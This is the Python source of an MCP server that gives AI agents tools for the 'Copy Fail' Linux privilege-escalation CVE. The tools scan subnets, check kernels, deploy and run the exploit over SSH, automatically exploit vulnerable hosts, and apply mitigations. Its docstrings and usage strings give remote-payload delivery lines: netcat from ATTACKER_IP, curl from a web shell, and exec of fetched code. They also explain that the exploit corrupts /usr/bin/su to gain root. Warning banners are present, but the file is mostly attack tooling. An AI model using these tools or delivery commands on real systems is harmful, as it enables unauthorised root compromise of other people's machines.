"""
CVE-2026-31431 Copy Fail — MCP Server

FastMCP 3.2 tools for testing Linux hosts against the Copy Fail LPE.
"""

import logging
import os

from fastmcp import FastMCP

from .checker import check_kernel, run_exploit, assess, apply_mitigation, EXPLOIT_SCRIPT
from .scanner import scan_subnet
from .ssh_client import SSHClient

logger = logging.getLogger(__name__)

mcp = FastMCP("copy-fail-mcp")

DEFAULT_SSH_TIMEOUT = 30.0
WARNING_BANNER = """
WARNING: CVE-2026-31431 Copy Fail is a REAL kernel LPE affecting all Linux
kernels >= 4.14. This tool will attempt to EXPLOIT the target to confirm
the vulnerability. Only run against systems you OWN or have WRITTEN
PERMISSION to test. Unauthorized use may be illegal.
"""


def _warn() -> str:
    return WARNING_BANNER.strip()


@mcp.tool()
async def cf_get_exploit_script() -> dict:
    """Get the raw CVE-2026-31431 PoC script.

    Returns the 732-byte Python exploit as text. Pipe this over any channel
    (netcat, web shell, curl pipe, etc.) to a target that has Python 3.10+
    but no SSH access to this MCP server.

    Usage over netcat:
      copy-fail-mcp tool cf_get_exploit_script | nc target 8080 | python3

    Usage over a web shell:
      curl -s http://your-mcp-server:10909/exploit | python3

    WARNING: This is the actual LPE exploit. Running it on a vulnerable
    system will give you root. Ensure you have authorization.
    """
    return {
        "status": "ok",
        "warning": _warn(),
        "script": EXPLOIT_SCRIPT,
        "size_bytes": len(EXPLOIT_SCRIPT),
        "python_version": "3.10+ (stdlib only)",
        "usage": [
            "Save to file: echo '<script>' > /tmp/exp.py && python3 /tmp/exp.py",
            "Pipe direct: python3 -c 'import urllib.request; exec(urllib.request.urlopen(\"http://MCP-SERVER/exploit\").read())'",
            "netcat: nc ATTACKER_IP PORT | python3",
        ],
    }


@mcp.tool()
async def cf_exploit_local(
    target_path: str = "/tmp/.cf",
    cleanup: bool = True,
) -> dict:
    """Write the exploit script to a local path for manual deployment.

    Use this when you already have a shell on the target (via web shell,
    physical access, container exec, etc.) and just need the script placed.

    Args:
        target_path: Where to write the exploit on the local filesystem.
        cleanup: Remove the script after execution completes.

    Returns:
        Confirmation and instructions for running.
    """
    import os as _os

    try:
        with open(target_path, "w") as f:
            f.write(EXPLOIT_SCRIPT)
        _os.chmod(target_path, 0o755)

        return {
            "status": "ok",
            "path": target_path,
            "size_bytes": len(EXPLOIT_SCRIPT),
            "warning": _warn(),
            "instructions": [
                f"Script written to {target_path}",
                "Run it: python3 {target_path}",
                "Or if being piped: cat {target_path} | python3",
            ],
        }
    except Exception as e:
        return {"status": "error", "error": f"Failed to write: {e}"}


@mcp.tool()
async def cf_scan_network(
    cidr: str = "192.168.1.0/24",
    port: int = 22,
    timeout: float = 1.5,
    max_hosts: int = 256,
    only_linux: bool = True,
) -> dict:
    """Scan a local subnet for Linux hosts with an open SSH port.

    Uses async TCP connect probes — no raw sockets or special permissions needed.
    Returns host IP, SSH banner, and whether it looks like Linux.

    Args:
        cidr: CIDR subnet to scan (e.g., '192.168.1.0/24', '10.0.0.0/24').
        port: TCP port to probe (default: 22 for SSH).
        timeout: Seconds to wait per host probe.
        max_hosts: Max IPs to scan (default 256).
        only_linux: Only return hosts identified as Linux via SSH banner.

    Returns:
        List of discovered hosts with IP, banner, and Linux detection.
    """
    try:
        result = await scan_subnet(
            cidr=cidr,
            port=port,
            timeout=timeout,
            max_hosts=max_hosts,
            only_linux=only_linux,
        )
        result["warning"] = _warn()
        return result
    except Exception as e:
        logger.error(f"Scan failed: {e}", exc_info=True)
        return {"status": "error", "error": str(e)}


@mcp.tool()
async def cf_check_target(
    host: str,
    username: str = "root",
    port: int = 22,
    timeout: float = DEFAULT_SSH_TIMEOUT,
) -> dict:
    """Check a remote Linux host for CVE-2026-31431 vulnerability.

    Connects via SSH agent forwarding, checks kernel version,
    CONFIG_CRYPTO_USER_API_AEAD status, and distro patch status.

    Args:
        host: Target hostname or IP.
        username: SSH user (must have agent access).
        port: SSH port (default: 22).
        timeout: SSH connection timeout in seconds.

    Returns:
        Kernel version, vulnerability status, mitigation info.
    """
    ssh = SSHClient(host=host, port=port, username=username, timeout=timeout)
    connected = await ssh.connect()
    if not connected:
        return {
            "status": "error",
            "error": f"Failed to connect to {username}@{host}:{port}",
            "note": "Ensure SSH agent is running and key is added",
        }

    try:
        result = await check_kernel(ssh)
        if result["status"] == "ok":
            result["warning"] = _warn()
        return result
    finally:
        await ssh.close()


@mcp.tool()
async def cf_run_exploit(
    host: str,
    username: str = "root",
    port: int = 22,
    timeout: float = DEFAULT_SSH_TIMEOUT,
    cleanup: bool = True,
) -> dict:
    """Run the Copy Fail PoC on a target Linux host.

    WARNING: This deploys and executes the actual LPE exploit.
    Target must be vulnerable (confirmed via cf_check_target first).

    The exploit corrupts /usr/bin/su in page cache to gain root.
    After success, you will have a root shell.

    Args:
        host: Target hostname or IP.
        username: SSH user.
        port: SSH port.
        timeout: SSH timeout.
        cleanup: Remove exploit script after run.

    Returns:
        Whether root was obtained and full command output.
    """
    ssh = SSHClient(host=host, port=port, username=username, timeout=timeout)
    connected = await ssh.connect()
    if not connected:
        return {"status": "error", "error": "SSH connection failed", "warning": _warn()}

    try:
        result = await run_exploit(ssh, cleanup=cleanup)
        result["warning"] = _warn()
        return result
    finally:
        await ssh.close()


@mcp.tool()
async def cf_apply_mitigation(
    host: str,
    username: str = "root",
    port: int = 22,
    timeout: float = DEFAULT_SSH_TIMEOUT,
    dry_run: bool = True,
) -> dict:
    """Apply mitigation for CVE-2026-31431 on a target host.

    Detects the kernel config and applies the correct mitigation:
    - Module (=m): Blacklist algif_aead via modprobe (no reboot)
    - Built-in (=y): grubby initcall_blacklist (reboot required)

    Use dry_run=True first to see what commands would be run.

    Args:
        host: Target hostname or IP.
        username: SSH user.
        port: SSH port.
        timeout: SSH connection timeout.
        dry_run: If True, only show commands without executing.

    Returns:
        Mitigation status, commands run, reboot required flag.
    """
    ssh = SSHClient(host=host, port=port, username=username, timeout=timeout)
    connected = await ssh.connect()
    if not connected:
        return {"status": "error", "error": "SSH connection failed", "warning": _warn()}

    try:
        result = await apply_mitigation(ssh, dry_run=dry_run)
        result["warning"] = _warn()
        return result
    finally:
        await ssh.close()


@mcp.tool()
async def cf_assess(
    host: str,
    username: str = "root",
    port: int = 22,
    timeout: float = DEFAULT_SSH_TIMEOUT,
    force: bool = False,
    cleanup: bool = True,
) -> dict:
    """Full assessment: check + optionally exploit a Linux host.

    Checks kernel version first. If vulnerable and not patched,
    runs the exploit automatically. Use force=True to override.

    Args:
        host: Target hostname or IP.
        username: SSH user.
        port: SSH port.
        timeout: SSH connection timeout.
        force: Run exploit even if kernel appears non-vulnerable.
        cleanup: Remove exploit script after run.

    Returns:
        Full assessment with kernel info and exploit result.
    """
    ssh = SSHClient(host=host, port=port, username=username, timeout=timeout)
    connected = await ssh.connect()
    if not connected:
        return {"status": "error", "error": "SSH connection failed", "warning": _warn()}

    try:
        result = await assess(ssh, force=force, cleanup=cleanup)
        result["warning"] = _warn()
        return result
    finally:
        await ssh.close()
